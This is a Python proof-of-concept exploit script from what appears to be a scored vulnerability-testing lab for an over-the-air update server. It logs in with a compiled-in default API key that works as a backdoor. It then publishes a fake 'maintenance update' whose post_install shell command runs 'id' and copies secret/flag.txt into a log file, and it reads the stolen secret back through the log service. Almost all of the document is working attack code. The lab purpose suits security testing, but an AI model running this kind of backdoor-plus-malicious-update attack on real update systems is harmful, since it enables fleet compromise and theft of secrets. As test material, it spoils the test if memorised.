#!/usr/bin/env python3
"""
PoC #2: Hardcoded default API-key backdoor on /publish
--------------------------------------------------------
checkPublishAuth() (auth.go) accepts the compiled-in constant defaultAPIKey
("ota-default-key-2024") as a BACKDOOR - `presented == apiKey() || presented ==
defaultAPIKey`. Crucially it keeps working even when an operator has set a real
OTA_API_KEY (so apiKey() != defaultAPIKey): the hardcoded credential is valid
ALONGSIDE the configured one. That default ships in this source and in the
image; this PoC never receives any credential out-of-band, it uses only the
value baked into the software.

This matters for scoring: a deployment behind a minted OTA_API_KEY (what a
scoring harness runs) does NOT silence this - the default still authenticates,
so the vuln is genuinely live, not self-healed by configuration. (A bare
"defaults to the compiled-in key only when OTA_API_KEY is unset" would instead
sit in its fixed state the moment a key is minted, and couldn't be scored.)

Scoreable impact: authenticating with nothing but the backdoor default key,
this PoC publishes an update for "log" whose post_install exfiltrates
log-module's real per-deployment secret (secret/flag.txt, from the minted
LOG_FLAG_VALUE) once log's ota-agent.sh polls, downloads, and applies it,
read back through log-module's real GET /logs/{name}. So the backdoor leads
straight to a fleet member's minted secret - not just a 201.

If a team fixes #2 by dropping the `|| presented == defaultAPIKey` clause (and
shipping no working default), the default is rejected and this PoC reports
failure - the defended state. It cashes out through #4's post_install sink
(while #7 uses #3's tar-slip sink), so the three unauthenticated-publish
routes (#2/#7/#9) are split across the two delivery sinks and no single
server-side sink fix in publish.go flips all three (see vuln_tests/README.md).

Run against the docker-compose fleet:
  docker compose -f vuln_tests/docker-compose.yml run --build --rm poc \
      python3 02_default_api_key.py ota 8090
"""
import hashlib
import io
import json
import os
import re
import sys
import tarfile
import time
import urllib.error
import urllib.request
import uuid

OTA_HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
OTA_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8090
OTA_BASE = f"http://{OTA_HOST}:{OTA_PORT}"
LOG_HOST = os.environ.get("LOG_HOST", "log")
LOG_PORT = int(os.environ.get("LOG_PORT", "8080"))
LOG_BASE = f"http://{LOG_HOST}:{LOG_PORT}"
DEFAULT_API_KEY = "ota-default-key-2024"  # read straight out of auth.go, never told to us
EXPECTED_FLAG = os.environ.get("LOG_FLAG_VALUE", "")
FLAG_RE = re.compile(r"FLAG\{[^}]{1,256}\}")


def make_targz(entries):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, content in entries:
            info = tarfile.TarInfo(name=name)
            info.size = len(content)
            tf.addfile(info, io.BytesIO(content))
    return buf.getvalue()


def multipart(fields, filename, file_bytes):
    boundary = "----otaPoC" + uuid.uuid4().hex
    body = b""
    for name, value in fields.items():
        body += (f"--{boundary}\r\nContent-Disposition: form-data; "
                  f'name="{name}"\r\n\r\n{value}\r\n').encode()
    body += (f"--{boundary}\r\nContent-Disposition: form-data; "
              f'name="package"; filename="{filename}"\r\n'
              "Content-Type: application/gzip\r\n\r\n").encode()
    body += file_bytes + b"\r\n"
    body += f"--{boundary}--\r\n".encode()
    return boundary, body


def main():
    token = uuid.uuid4().hex[:12]
    proof_name = f"defkey_{token}.txt"
    package = make_targz([("README.txt", b"routine log-module maintenance update\n")])
    sha = hashlib.sha256(package).hexdigest()
    version = f"1.0.0-defkey-{token[:6]}"

    post_install = (
        f"id > logs/{proof_name}; "
        f"echo OTA_DEFKEY_{token} >> logs/{proof_name}; "
        f"cat secret/flag.txt >> logs/{proof_name}"
    )
    manifest = {"module": "log", "version": version, "sha256": sha, "post_install": post_install}

    boundary, body = multipart({"manifest": json.dumps(manifest)}, "pkg.tar.gz", package)
    req = urllib.request.Request(f"{OTA_BASE}/publish", data=body, method="POST")
    req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
    req.add_header("X-OTA-Api-Key", DEFAULT_API_KEY)
    print(f"[*] Publishing log {version} using ONLY the compiled-in default key "
          f"'{DEFAULT_API_KEY}' (never provided to us by an operator; valid even if a real "
          f"OTA_API_KEY is configured)")
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            print(f"[*] /publish -> {r.status} (the backdoor default key still authenticates)")
    except urllib.error.HTTPError as e:
        print(f"[*] /publish -> {e.code} {e.read().decode(errors='replace')[:200]}")
        print("[-] Default key was rejected - the backdoor clause was removed (vuln #2 fixed).")
        return 1

    print("[*] Waiting for log-module's agent to poll, apply, and run post_install...")
    deadline = time.time() + 60
    got = None
    while time.time() < deadline:
        try:
            with urllib.request.urlopen(f"{LOG_BASE}/logs/{proof_name}", timeout=5) as r:
                text = r.read().decode(errors="replace")
            if f"OTA_DEFKEY_{token}" in text:
                got = text
                break
        except (urllib.error.HTTPError, urllib.error.URLError, ConnectionError):
            pass
        time.sleep(3)

    if got is None:
        print("[-] Timed out waiting for the applied package's output via /logs/{name}")
        return 1

    m = FLAG_RE.search(got)
    if not m:
        print("[-] Package was applied, but no FLAG{...} was exfiltrated from secret/flag.txt")
        return 1
    flag = m.group(0)

    if EXPECTED_FLAG and flag != EXPECTED_FLAG:
        print(f"[-] Exfiltrated {flag!r} but expected {EXPECTED_FLAG!r} - value mismatch.")
        return 1
    print("[+] SCORED: the compiled-in default API key (a backdoor, valid even behind a minted "
          "OTA_API_KEY) authenticated a publish that a fleet member then applied, exfiltrating the "
          f"log host's minted per-deployment secret {flag!r}.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
